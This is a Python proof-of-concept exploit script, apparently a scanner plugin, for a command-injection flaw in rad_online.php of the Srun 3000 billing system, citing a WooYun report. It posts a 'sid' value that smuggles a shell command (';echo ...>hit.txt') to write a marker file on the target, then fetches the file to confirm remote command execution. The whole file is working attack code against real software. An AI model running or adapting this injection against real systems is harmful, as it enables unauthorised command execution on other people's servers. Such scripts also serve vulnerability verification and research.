#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 深澜软件srun3000计费系统rad_online.php命令执行bypass
referer: http://www.wooyun.org/bugs/wooyun-2015-092381
author: Lucifer
description: 文件rad_online.php中,post参数sid存在命令执行漏洞,绕过防御。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class srun_rad_online_bypass_rce_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/rad_online.php"
        vulnurl = self.url + payload
        post_data = {
            "action":"dm",
            "sid":';echo "81dc9bdb52d04dc20036dbd8313ed055">hit.txt'
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            shellurl = self.url + "/hit.txt"
            req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                cprint("[+]存在深澜软件srun3000计费系统rad_online.php命令执行bypass漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl, "red")
                return True, vulnurl, "深澜软件srun3000计费系统rad_online.php命令执行bypass", str(payload), req.text
            else:
                cprint("[-]不存在srun_rad_online_bypass_rce漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = srun_rad_online_bypass_rce_BaseVerify(sys.argv[1])
    testVuln.run()
